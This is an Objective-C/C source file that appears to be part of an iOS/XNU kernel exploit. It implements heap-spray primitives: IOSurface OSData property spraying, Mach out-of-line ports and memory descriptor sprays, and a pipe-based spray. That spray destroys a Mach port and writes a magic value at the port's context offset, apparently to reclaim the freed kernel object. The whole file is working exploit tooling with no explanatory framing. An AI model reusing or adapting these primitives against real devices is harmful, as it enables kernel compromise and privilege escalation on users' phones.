#include <Foundation/Foundation.h>

#include "iosurface.h"
#include "helper.h"
#include "spray.h"

void create_osdata_serialisation_string(char **buffer, const char *data,
					size_t repetitions, char *key)
{
	int i;
	size_t buffer_size;
	char spray[strlen("<data>")
		   + strlen(data)
		   + strlen("</data>\n")
		   + 1];

        buffer_size  = strlen("<array>\n");
	buffer_size += strlen("<array>\n");
	buffer_size += sizeof(spray) * repetitions;
	buffer_size += strlen("</array>\n");
	buffer_size += strlen("<string>");
	buffer_size += strlen("spray");
	buffer_size += strlen("</string>\n");
	buffer_size += strlen("</array>\n");
	buffer_size += 1;
	*buffer = calloc(buffer_size, sizeof(char));

	BEGIN_SPRAY_STRING(*buffer);
	for (i = 0; i < repetitions; i++)
	{
	    CREATE_SPRAY_DATA(spray, data);
	    strcat(*buffer, spray);
	}
	APPEND_SPRAY_STRING_END(*buffer, key);
}

void create_string_for_heap_spray_with_zeroes(char **input_buffer, size_t size, char *key)
{
    uint8_t *spray_data;
    const char *spray_string;
    NSData *nsdata;
    NSString *base64_encoded;

    spray_data = calloc(size, sizeof(uint8_t));
    nsdata = [NSData dataWithBytes:(const void*)spray_data length:size];
    base64_encoded = [nsdata base64EncodedStringWithOptions:0];
    spray_string = [base64_encoded cStringUsingEncoding:NSASCIIStringEncoding];

    DEBUG_LOG2("Encoded Spray String: %@", base64_encoded);

    create_osdata_serialisation_string(input_buffer, spray_string, N_OSDATA_SPRAY, key);
}

void create_string_for_heap_spray_with_data(char **input_buffer, size_t size, char *key,
					    void *spray_data)
{
    const char *spray_string;
    NSData *nsdata;
    NSString *base64_encoded;

    nsdata = [NSData dataWithBytes:(const void*)spray_data length:size];
    base64_encoded = [nsdata base64EncodedStringWithOptions:0];
    spray_string = [base64_encoded cStringUsingEncoding:NSASCIIStringEncoding];

    DEBUG_LOG2("Encoded Spray String: %@", base64_encoded);

    create_osdata_serialisation_string(input_buffer, spray_string, N_OSDATA_SPRAY, key);
}

int io_surface_spray(io_connect_t *connection, uint32_t *surface_id,
		     size_t size, char *key, void *data, size_t data_size)
{
    uint8_t *spray_data;
    char *input_buffer;
    int ret;

    if (data == NULL)
    {
	create_string_for_heap_spray_with_zeroes(&input_buffer, size, key);
    }
    else
    {
	if (data_size > size)
	    DEBUG_LOG("WARNING: data_size > size");

	spray_data = calloc(size, sizeof(uint8_t));
	memcpy(spray_data, data, data_size);
	create_string_for_heap_spray_with_data(&input_buffer, size, key, spray_data);
    }

    if ((ret = io_surface_set_value(connection, surface_id, &input_buffer)))
    {
	ERROR_LOG("Could Not Spray Heap Via IOSurface");
    }
    else
    {
	DEBUG_LOG("Sprayed Heap Via IOSurface");
    }

    free(input_buffer);

    return ret;
}

struct ool_leak_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

typedef struct ool_leak_msg * ool_leak_msg_t;

int ool_ports_descriptor_spray(mach_port_t *receive_port, size_t n_ool_ports_descriptor_messages,
			       size_t count, mach_port_t *data)
{
    size_t i, msg_size;
    mach_port_t *ports;
    ool_leak_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_leak_msg) +
		(n_ool_ports_descriptor_messages * sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  msg_size;
    ool_msg->header.msgh_remote_port = *receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = n_ool_ports_descriptor_messages;

    for (i = 0; i < n_ool_ports_descriptor_messages; i++) {
	ool_msg->ool_ports[i].address = data;
	ool_msg->ool_ports[i].count = count;
	ool_msg->ool_ports[i].deallocate = 0;
	ool_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
	ool_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	ool_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    ret = mach_msg_send(&ool_msg->header);
    if (ret != MACH_MSG_SUCCESS)
    {
	ERROR_LOG("Sending Mach Message Failed: %x", ret);
	ERROR_LOG("Could Not Spray Heap Via Port Descriptors");
	return 1;
    }
    else
	DEBUG_LOG("Successfully Sent Mach Messages For Port Descriptor Spray");

    free(ool_msg);

    return 0;
}


struct ool_spray_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t ool[];
};

typedef struct ool_spray_msg * ool_spray_msg_t;

int ool_descriptor_spray(mach_port_t *spray_port, uint8_t *data, size_t data_size)
{
    size_t msg_size;
    ool_spray_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = sizeof(struct ool_spray_msg) + sizeof(mach_msg_ool_descriptor_t);

    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size = msg_size;
    ool_msg->header.msgh_remote_port = *spray_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x20202020;

    ool_msg->body.msgh_descriptor_count = 1;

    ool_msg->ool->address = data;
    ool_msg->ool->size = KALLOC_4096;
    ool_msg->ool->deallocate = 0;
    ool_msg->ool->type = MACH_MSG_OOL_DESCRIPTOR;
    ool_msg->ool->copy = MACH_MSG_PHYSICAL_COPY;

    if ((ret = mach_msg_send(&ool_msg->header)) != MACH_MSG_SUCCESS)
    {
	ERROR_LOG("Sending Mach Message Failed: %x", ret);
	ERROR_LOG("Could Not Spray Heap Via Memory Descriptors");
	free(ool_msg);
	return 1;
    }
    else
    {
	free(ool_msg);
	return 0;
    }
}

void pipe_port_spray(int read_fd, int write_fd, uint64_t offset, mach_port_t *port_to_destroy)
{
    uint8_t *ip_context_ptr, *data;
    mach_port_context_t magic;

    magic = MAGIC_CONSTANT;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    ip_context_ptr = data + offset + IP_CONTEXT_PORT_OFFSET;

    memcpy(ip_context_ptr, &magic, sizeof(mach_port_context_t));

    mach_port_destroy(mach_task_self(), *port_to_destroy);
    write(write_fd, data, KALLOC_4096);
    free(data);
}
